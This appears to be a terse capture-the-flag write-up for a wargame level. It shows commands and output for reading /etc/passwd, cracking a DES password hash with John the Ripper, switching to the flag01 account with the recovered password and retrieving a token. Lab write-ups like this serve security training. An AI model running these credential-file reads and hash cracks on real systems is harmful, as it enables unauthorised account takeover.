cat /etc/passwd ----> copy passwd ---> john hash
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])
No password hashes left to crack (see FAQ)
whymami@whymami:~$ john --show hash
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash


su flag01 ----> abcdefg

getflag ----> Check flag.Here is your token : f2av5il02puano7naaf6adaaf